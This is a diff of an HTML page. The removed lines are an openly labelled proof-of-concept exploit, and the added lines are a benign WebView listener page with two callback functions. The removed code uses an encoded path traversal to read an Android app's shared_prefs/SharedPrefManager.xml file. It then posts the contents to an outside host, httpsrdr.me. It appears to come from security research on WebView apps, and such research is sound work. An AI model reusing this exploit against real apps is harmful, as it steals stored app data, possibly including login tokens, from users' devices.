@@ -1,44 +1,39 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Page</title>
-  </head>
-  <body>
-    <h1> PoC</h1>
-    <script type="text/javascript">
-      function theftFile(path, callback) {
-        var oReq = new XMLHttpRequest();
+<head>
+  <title>WebView Listener Example</title>
+</head>
+<body>
+<h1>WebView JS Listener</h1>
 
-        oReq.open(
-          'GET',
-          'https://0xblaziken.github.io/builds/..%2F'+encodeURIComponent(path),
-          true
-        );
-        oReq.onload = function (e) {
-          callback(oReq.responseText);
-        };
-        oReq.onerror = function (e) {
-          callback(null);
-        };
-        oReq.send();
-      }
+<script>
+// Define the function that native will call
+function OnebotJsCallBack(data) {
+    console.log("Received from native:", data);
+  console.log("onebot");
+    
+    // Optionally, show it on the page
+    const output = document.getElementById('output');
+    if (output) {
+        output.innerText = "Native says: " + data;
+    }
+}
 
-      theftFile('shared_prefs/SharedPrefManager.xml', function (contents) {
-        fetch('https://www.httpsrdr.me/endpoint', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'text/plain'
-    },
-    body: contents
-  })
-  .then(response => response.text())
-  .then(result => {
-    console.log('POST success:', result);
-  })
-  .catch(error => {
-    console.error('POST error:', error);
-  });
-      });
-    </script>
-  </body>
+  function jsCallback(data) {
+    console.log("Received from native:", data);
+  console.log("jscallback");
+    
+    // Optionally, show it on the page
+    const output = document.getElementById('output');
+    if (output) {
+        output.innerText = "Native says: " + data;
+    }
+}
+
+// Optional: for testing in browser
+// someFunction("Test message from browser");
+</script>
+
+<div id="output" style="margin-top: 20px; font-weight: bold;"></div>
+</body>
 </html>
